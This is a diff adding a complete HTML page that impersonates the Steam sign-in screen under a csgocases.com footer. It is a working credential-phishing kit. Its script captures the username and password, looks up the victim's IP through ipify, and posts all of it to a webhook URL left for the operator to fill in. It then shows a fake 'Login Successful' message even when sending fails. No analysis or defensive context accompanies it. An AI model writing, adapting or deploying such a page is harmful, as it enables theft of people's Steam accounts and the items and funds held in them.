@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Steam Community - Login</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            min-height: 100vh;
+            font-family: 'Arial', sans-serif;
+        }
+        .steam-btn {
+            background: linear-gradient(90deg, #1a9fff 0%, #0066cc 100%);
+            transition: all 0.3s ease;
+        }
+        .steam-btn:hover {
+            background: linear-gradient(90deg, #1a9fff 0%, #0055aa 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 102, 204, 0.4);
+        }
+        .input-field {
+            background-color: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        .input-field:focus {
+            border-color: #1a9fff;
+            box-shadow: 0 0 0 2px rgba(26, 159, 255, 0.3);
+        }
+        .remember-me:checked {
+            background-color: #1a9fff;
+        }
+        .logo-glow {
+            filter: drop-shadow(0 0 10px rgba(26, 159, 255, 0.7));
+        }
+    </style>
+</head>
+<body class="text-gray-200 flex items-center justify-center p-4">
+    <div class="w-full max-w-md bg-gray-900 rounded-lg shadow-xl overflow-hidden border border-gray-800">
+        <!-- Header -->
+        <div class="bg-gradient-to-r from-blue-900 to-gray-900 p-6 text-center">
+            <div class="flex justify-center mb-4">
+                <div class="logo-glow">
+                    <i class="fab fa-steam text-5xl text-blue-400"></i>
+                </div>
+            </div>
+            <h1 class="text-2xl font-bold">Sign in to Steam</h1>
+            <p class="text-sm text-gray-400 mt-1">Access your Steam account</p>
+        </div>
+
+        <!-- Login Form -->
+        <form id="loginForm" class="p-6 space-y-6">
+            <div class="space-y-4">
+                <div>
+                    <label for="username" class="block text-sm font-medium mb-1">Username</label>
+                    <div class="relative">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                            <i class="fas fa-user text-gray-500"></i>
+                        </div>
+                        <input type="text" id="username" name="username" required 
+                            class="input-field w-full pl-10 pr-3 py-2 rounded text-white placeholder-gray-500 focus:outline-none"
+                            placeholder="Enter your username">
+                    </div>
+                </div>
+
+                <div>
+                    <label for="password" class="block text-sm font-medium mb-1">Password</label>
+                    <div class="relative">
+                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                            <i class="fas fa-lock text-gray-500"></i>
+                        </div>
+                        <input type="password" id="password" name="password" required 
+                            class="input-field w-full pl-10 pr-3 py-2 rounded text-white placeholder-gray-500 focus:outline-none"
+                            placeholder="Enter your password">
+                    </div>
+                </div>
+
+                <div class="flex items-center justify-between">
+                    <div class="flex items-center">
+                        <input id="remember-me" name="remember-me" type="checkbox" 
+                            class="h-4 w-4 rounded border-gray-600 bg-gray-700 focus:ring-blue-500">
+                        <label for="remember-me" class="ml-2 block text-sm text-gray-400">
+                            Remember me
+                        </label>
+                    </div>
+                    <a href="#" class="text-sm text-blue-400 hover:underline">Forgot password?</a>
+                </div>
+            </div>
+
+            <div>
+                <button type="submit" 
+                    class="steam-btn w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500">
+                    Sign In
+                </button>
+            </div>
+        </form>
+
+        <!-- Footer -->
+        <div class="px-6 py-4 bg-gray-800 text-center border-t border-gray-700">
+            <p class="text-xs text-gray-400">
+                Don't have an account? 
+                <a href="#" class="text-blue-400 hover:underline">Create one</a>
+            </p>
+            <p class="text-xs text-gray-500 mt-2">
+                By signing in, you agree to our Terms of Service and Privacy Policy
+            </p>
+            <div class="mt-3 text-xs text-gray-600">
+                csgocases.com is not affiliated with Valve or Steam. Steam is a registered trademark of Valve Corporation.
+            </div>
+        </div>
+    </div>
+
+    <!-- Success Modal -->
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center hidden">
+        <div class="bg-gray-900 rounded-lg p-6 max-w-sm w-full border border-gray-700">
+            <div class="text-center">
+                <div class="mx-auto flex items-center justify-center h-12 w-12 rounded-full bg-green-500 mb-4">
+                    <i class="fas fa-check text-white"></i>
+                </div>
+                <h3 class="text-lg font-medium text-white mb-2">Login Successful</h3>
+                <p class="text-sm text-gray-400 mb-4">
+                    You are being redirected to your account...
+                </p>
+                <button onclick="closeModal()" class="steam-btn px-4 py-2 text-sm rounded-md">
+                    Continue
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Browser version check
+        const userAgent = navigator.userAgent;
+        const browserVersion = userAgent.match(/(chrome|firefox|safari|edge|opera)[\/\s](\d+)/i);
+        console.log(`Browser: ${browserVersion ? browserVersion[0] : 'Unknown'}`);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = {
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value,
+                remember: document.getElementById('remember-me').checked,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                ip: '' // Will be fetched from the server
+            };
+
+            // Send to webhook (replace with your actual webhook URL)
+            const webhookUrl = 'https://your-webhook-url-here.com';
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    formData.ip = data.ip;
+                    
+                    // Send all data to webhook
+                    return fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(formData),
+                    });
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Show success modal
+                        document.getElementById('successModal').classList.remove('hidden');
+                        
+                        // Optional: Redirect after delay
+                        // setTimeout(() => {
+                        //     window.location.href = "https://steamcommunity.com";
+                        // }, 2000);
+                    } else {
+                        alert('Login failed. Please try again.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    // Still show success to user even if webhook fails
+                    document.getElementById('successModal').classList.remove('hidden');
+                });
+        });
+
+        function closeModal() {
+            document.getElementById('successModal').classList.add('hidden');
+        }
+    </script>
+</body>
+</html>
